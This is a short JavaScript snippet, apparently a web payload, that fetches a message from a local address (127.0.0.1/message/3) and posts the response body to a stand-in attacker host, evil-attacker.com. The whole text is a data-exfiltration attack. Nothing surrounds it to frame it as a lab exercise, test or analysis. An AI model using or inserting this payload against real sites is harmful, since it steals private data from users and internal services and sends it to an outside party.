fetch("http://127.0.0.1/message/3").then((r) => r.text()).then((r) => {
    fetch("http://evil-attacker.com/data", {method: "post", body: r});
});
